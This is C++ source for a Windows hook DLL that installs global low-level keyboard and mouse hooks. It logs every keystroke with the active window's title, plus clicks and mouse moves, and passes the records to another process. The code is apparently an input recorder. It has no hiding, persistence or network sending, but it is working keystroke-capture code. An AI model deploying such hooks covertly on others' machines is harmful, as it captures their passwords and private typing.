#include <windows.h>
#include <string>
#include <cstdio>
#include "logger.h"
#include "config.h"

HHOOK hKeyboardHook = NULL;
HHOOK hMouseHook = NULL;
Logger logger("logs"); 
POINT lastMousePos = { 0 };

// 获取功能键的可读名称
std::string GetVirtualKeyName(WPARAM vkCode) {
    switch (vkCode) {
        case VK_LCONTROL: case VK_RCONTROL: case VK_CONTROL: return "Ctrl";
        case VK_LSHIFT: case VK_RSHIFT: case VK_SHIFT: return "Shift";
        case VK_LMENU: case VK_RMENU: case VK_MENU: return "Alt";
        case VK_LWIN: case VK_RWIN: return "Win";
        case VK_ESCAPE: return "Esc";
        case VK_CAPITAL: return "CapsLock";
        case VK_TAB: return "Tab";
        case VK_BACK: return "Backspace";
        case VK_RETURN: return "Enter";
        case VK_SPACE: return "Space";
        case VK_PRIOR: return "PageUp";
        case VK_NEXT: return "PageDown";
        case VK_END: return "End";
        case VK_HOME: return "Home";
        case VK_LEFT: return "Left";
        case VK_UP: return "Up";
        case VK_RIGHT: return "Right";
        case VK_DOWN: return "Down";
        case VK_INSERT: return "Insert";
        case VK_DELETE: return "Delete";
        default:
            if (vkCode >= VK_F1 && vkCode <= VK_F12) 
                return "F" + std::to_string(vkCode - VK_F1 + 1);
            return "Unknown";
    }
}

std::string GetActiveWindowTitleStr() {
    HWND hwnd = GetForegroundWindow();
    wchar_t wTitle[256];
    if (GetWindowTextW(hwnd, wTitle, 256) > 0) {
        char title[512];
        WideCharToMultiByte(CP_UTF8, 0, wTitle, -1, title, 512, NULL, NULL);
        return std::string(title);
    }
    return "Unknown";
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && Config::recordKeyboard) {
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
            
            BYTE keyState[256];
            GetKeyboardState(keyState);
            keyState[VK_SHIFT] = GetKeyState(VK_SHIFT);
            keyState[VK_CAPITAL] = GetKeyState(VK_CAPITAL);

            wchar_t wch[5];
            int res = ToUnicode(p->vkCode, p->scanCode, keyState, wch, 4, 0);

            char buf[512];
            std::string windowName = GetActiveWindowTitleStr();
            
            if (res > 0) { // 如果是 ASCII 或可见字符
                wch[res] = L'\0';
                char utf8Char[16];
                WideCharToMultiByte(CP_UTF8, 0, wch, -1, utf8Char, 16, NULL, NULL);
                sprintf_s(buf, "[%s] Key: %s", windowName.c_str(), utf8Char);
            } else { // 否则显示功能键名称
                std::string keyName = GetVirtualKeyName(p->vkCode);
                sprintf_s(buf, "[%s] Special: [%s]", windowName.c_str(), keyName.c_str());
            }
            logger.log(buf); // 内部会发送 WM_COPYDATA
        }
    }
    return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
}

LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && Config::recordMouse) {
        MSLLHOOKSTRUCT* p = (MSLLHOOKSTRUCT*)lParam;
        std::string action = "";
        if (wParam == WM_LBUTTONDOWN) action = "Left Click";
        else if (wParam == WM_RBUTTONDOWN) action = "Right Click";
        else if (wParam == WM_MOUSEMOVE) {
            int dx = p->pt.x - lastMousePos.x, dy = p->pt.y - lastMousePos.y;
            if (abs(dx) > 15 || abs(dy) > 15) {
                char mbuf[64]; sprintf_s(mbuf, "Move: %d,%d", dx, dy);
                action = mbuf; lastMousePos = p->pt;
            }
        }
        if (!action.empty()) {
            char buf[512];
            sprintf_s(buf, "[%s] %s", GetActiveWindowTitleStr().c_str(), action.c_str());
            logger.log(buf);
        }
    }
    return CallNextHookEx(hMouseHook, nCode, wParam, lParam);
}

extern "C" __declspec(dllexport) void SetRecordConfig(bool k, bool m, const wchar_t* t) {
    Config::recordKeyboard = k; Config::recordMouse = m;
}

extern "C" __declspec(dllexport) void InstallHook() {
    GetCursorPos(&lastMousePos);
    hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandleW(L"myhook.dll"), 0);
    hMouseHook = SetWindowsHookEx(WH_MOUSE_LL, MouseProc, GetModuleHandleW(L"myhook.dll"), 0);
}

extern "C" __declspec(dllexport) void UninstallHook() {
    if (hKeyboardHook) UnhookWindowsHookEx(hKeyboardHook);
    if (hMouseHook) UnhookWindowsHookEx(hMouseHook);
    hKeyboardHook = NULL; hMouseHook = NULL;
}